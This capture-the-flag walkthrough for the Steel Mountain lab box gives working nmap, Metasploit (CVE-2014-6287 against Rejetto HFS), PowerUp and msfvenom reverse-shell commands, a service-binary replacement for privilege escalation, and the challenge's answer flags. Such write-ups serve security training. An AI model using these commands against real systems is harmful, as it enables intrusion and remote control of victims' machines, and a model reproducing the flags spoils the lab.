We start the Steel Mountain machine with an nmap scan to look for open ports
```
nmap -sV -sC -vv -T4 10.10.139.92 -p-
```
We open the web page and answer the first question with ```Bill Harper``` .

We answer the next question which wants us to know the other port that the server is running on which is port ```8080```
It then asks us the name of the web server which is ```Rejetto Http File Server```.

We will be using ```CVE-2014-6287``` to exploit the webserver.

We start up Metasploit:

```
msfconsole

search CVE-2014-6287

show options

set RHOST 10.10.16.55

set RPORT 8080

set LHOST 10.12.18.176

set SRVHOST 10.12.18.176

exploit
```

We gain initial access and get the user flag ```��b04763b6fcf51fcd7c13abc7db4fd365```.

For priv escalation we start by downloading the PowerUp script and uploading it with metasploit:
```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# in metasploit
upload PowerUp.ps1
```
We then switch to a powershell shell in metasploit ```load powershell``` and then ```powershell_shell```.

Running the PowerUp script ```. .\PowerUp.ps1``` and ```Invoke-AllChecks```.

To get the root flag we stop the service to exploit and then creat a msfvenom payload.
```sc stop AdvancedSystemCareService9```
```msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe```

We exit out of the powershell session and upload the exploit then copy the exploit and replace the vulnerable file:
```
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"

# start listener on attack machine
nc -nlvp 4443

sc start AdvancedSystemCareService9
```
root flag: ```9af5f314f57607c00fd09803a587db80```

System has been rooted action no longer required.



